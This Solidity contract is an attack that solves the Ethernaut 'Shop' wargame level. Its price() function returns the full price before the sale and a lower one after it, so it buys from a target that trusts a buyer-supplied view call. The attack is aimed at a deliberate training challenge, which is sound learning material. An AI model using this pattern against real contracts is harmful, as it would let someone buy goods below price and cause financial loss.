// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IShop.sol";

/**
 * @title Shop Attack (Ethernaut Challenge Level 21 - Shop)
 * @author Emre Tepe (@emretepedev)
 * @notice Attack contract for level 21
 * @custom:ethernaut https://ethernaut.openzeppelin.com/level/0x3aCd4766f1769940cA010a907b3C8dEbCe0bd4aB
 * @custom:security-contact emretepedev@gmail.com
 */
contract ShopAttack {
    IShop private immutable target;

    /**
     * @param target_ Address of target contract
     */
    constructor(IShop target_) {
        target = target_;
    }

    /*//////////////////////////////////////////////////////////////
                                Attack
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Attack and solve the level
     */
    function attack() external {
        uint256 price_ = target.price();

        target.buy();

        require(target.isSold() && price_ > target.price(), "Shop: Attack failed");
    }

    /*//////////////////////////////////////////////////////////////
                            Helpers & Others
    //////////////////////////////////////////////////////////////*/

    function price() external view returns (uint256) {
        return target.price() - (target.isSold() ? 1 : 0);
    }
}
